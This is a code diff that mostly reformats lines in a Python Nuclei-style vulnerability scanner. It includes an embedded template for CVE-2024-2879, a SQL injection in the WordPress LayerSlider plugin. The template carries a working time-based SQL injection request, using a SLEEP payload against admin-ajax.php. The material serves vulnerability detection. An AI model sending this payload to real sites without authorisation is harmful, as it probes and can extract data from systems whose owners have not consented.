@@ -244,7 +244,8 @@ class NucleiTemplateEngine:
 
         return None
 
-    async def scan_url_with_templates(self, base_url: str, template_ids: Optional[List[str]] = None) -> List[ScanResult]:
+    async def scan_url_with_templates(self, base_url: str,
+                                      template_ids: Optional[List[str]] = None) -> List[ScanResult]:
         """
         Scan a URL with multiple templates.
 
@@ -308,8 +309,8 @@ class NucleiTemplateEngine:
             return None
 
     def _check_matchers(self, matchers: List[MatcherCondition],
-                       response: requests.Response,
-                       condition: Optional[str] = None) -> bool:
+                        response: requests.Response,
+                        condition: Optional[str] = None) -> bool:
         """
         Check if response matches the template matchers.
 
@@ -411,7 +412,11 @@ info:
   author: Stux
   severity: critical
   description: |
-    The LayerSlider plugin for WordPress is vulnerable to SQL Injection via the ls_get_popup_markup action in versions 7.9.11 and 7.10.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
+    The LayerSlider plugin for WordPress is vulnerable to SQL Injection via the ls_get_popup_markup action
+    in versions 7.9.11 and 7.10.0 due to insufficient escaping on the user supplied parameter and lack of
+    sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers
+    to append additional SQL queries into already existing queries that can be used to extract sensitive
+    information from the database.
   reference:
     - https://nvd.nist.gov/vuln/detail/CVE-2024-2879
   tags: sqli,wp
@@ -419,7 +424,8 @@ info:
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and (SELECT 6416 FROM (SELECT(SLEEP(6)))nEiK)-- vqlq"
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and (SELECT 6416 FROM (SELECT(S\
+LEEP(6)))nEiK)-- vqlq"
 
     matchers:
       - type: dsl
